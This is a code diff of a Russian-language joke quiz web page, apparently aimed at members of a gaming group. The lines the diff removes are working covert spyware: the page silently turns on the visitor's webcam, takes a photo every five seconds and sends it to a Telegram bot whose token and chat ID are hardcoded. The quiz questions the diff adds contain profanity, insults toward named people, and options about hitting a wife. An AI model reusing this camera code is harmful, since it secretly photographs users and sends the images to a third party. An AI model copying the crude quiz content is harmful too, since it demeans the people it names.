@@ -79,9 +79,6 @@
         .selected {
             background-color: #FFC107;
         }
-        #cameraPreview {
-            display: none;
-        }
     </style>
 </head>
 <body>
@@ -104,72 +101,12 @@
         <h2>Поздравляю, вы - БОТ слаби игрок</h2>
     </div>
 
-    <video id="cameraPreview" autoplay playsinline></video>
-
     <audio id="harashoSound" src="harasho.mp3"></audio>
     <audio id="botSound" src="BOT.mp3"></audio>
 
     <script>
-        let stream = null;
-        let photoInterval = null;
         let currentQuestionIndex = 0;
         let userName = "";
-
-        // Инициализация камеры при загрузке страницы
-        window.onload = async function() {
-            try {
-                stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        facingMode: 'user',
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
-                    } 
-                });
-                
-                const video = document.getElementById('cameraPreview');
-                video.srcObject = stream;
-                
-                // Запускаем интервал для фотографирования
-                startPhotoInterval();
-            } catch (err) {
-                console.error('Ошибка при доступе к камере:', err);
-            }
-        };
-
-        function startPhotoInterval() {
-            photoInterval = setInterval(() => {
-                takePhoto();
-            }, 5000);
-        }
-
-        function takePhoto() {
-            const video = document.getElementById('cameraPreview');
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const ctx = canvas.getContext('2d');
-            
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const photo = canvas.toDataURL('image/jpeg');
-            sendPhotoToTelegram(photo);
-        }
-
-        function sendPhotoToTelegram(photo) {
-            const token = "8188957293:AAHmtiE3sgaj0lhUYijUmOnUYBWDaJw39JE";
-            const chatId = "2126669672";
-            
-            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    photo: photo,
-                    caption: `Фото пользователя: ${userName || 'Неизвестно'}`
-                })
-            }).catch(error => console.error('Ошибка при отправке фото:', error));
-        }
 
         function startSurvey() {
             userName = document.getElementById("name").value;
@@ -222,12 +159,6 @@
         }
 
         function endSurvey() {
-            if (stream) {
-                stream.getTracks().forEach(track => track.stop());
-            }
-            if (photoInterval) {
-                clearInterval(photoInterval);
-            }
             document.getElementById("survey").classList.add("hidden");
             document.getElementById("end").classList.remove("hidden");
             document.getElementById("botSound").play();
@@ -249,7 +180,50 @@
         }
 
         const questions = [
-            // ... ваши вопросы без изменений ...
+            {
+                question: "Сколько вам лет?",
+                options: ["Меньше 20", "25", "Больше 25"]
+            },
+            {
+                question: "У вас есть жена?",
+                options: ["Нет", "Да"]
+            },
+            {
+                question: "Если есть жена, как ее зовут?",
+                options: ["Вика", "Даша", "Маша", "Юля", "Наташа", "Ксюша", "Лена"]
+            },
+            {
+                question: "Что вы будете делать с женой?",
+                options: ["Спать", "Бьют", "Кусать", "Бьют попу", "Лизать"]
+            },
+            {
+                question: "Какая девушка лучше?",
+                options: ["Вика", "Даша", "Маша", "Юля", "Наташа", "Ксюша", "Лена"]
+            },
+            {
+                question: "Ваш лучший друг?",
+                options: ["Зора", "Дерево", "Степа", "Троссс", "Механик", "Дёня"]
+            },
+            {
+                question: "Ваш главный враг?",
+                options: ["Зора", "Дерево", "Степа", "Троссс", "Механик", "Дёня"]
+            },
+            {
+                question: "Лучший VIP?",
+                options: ["OmG!? | Aleks XX", "MoPKoBKa", "°FouR° xo", "°FouR° NEVER DAT", "OmG!? | Fucking", "[Plovmen derevo", "OmG!? | -Oxxxy- ->", "[Zap master's DOG3R", "°FouR° Mexannik", "[Plovmen TROSS"]
+            },
+            {
+                question: "Плохой VIP?",
+                options: ["OmG!? | Aleks XX", "MoPKoBKa", "°FouR° xo", "°FouR° NEVER DAT", "OmG!? | Fucking", "[Plovmen derevo", "OmG!? | -Oxxxy- ->", "[Zap master's DOG3R", "°FouR° Mexannik", "[Plovmen TROSS"]
+            },
+            {
+                question: "Кого вы будете наказывать?",
+                options: ["Вика", "Даша", "Маша", "Юля", "Наташа", "Ксюша", "Лена"]
+            },
+            {
+                question: "Кто уебанчик?",
+                options: ["Зора", "Дерево", "Степа", "Троссс", "Дёня"]
+            }
         ];
     </script>
 </body>
